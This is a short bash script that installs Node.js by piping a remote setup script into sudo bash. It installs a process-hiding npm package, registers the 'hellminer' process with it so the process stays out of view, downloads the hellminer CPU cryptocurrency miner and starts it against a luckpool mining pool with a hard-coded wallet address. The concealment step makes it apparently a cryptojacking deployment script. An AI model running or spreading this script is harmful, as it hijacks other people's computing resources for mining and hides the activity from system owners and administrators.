#!/bin/bash
sudo apt update -y
sudo apt install screen -y
sudo apt install gcc -y 
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
ph add hellminer
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bankbang -p x --cpu 3
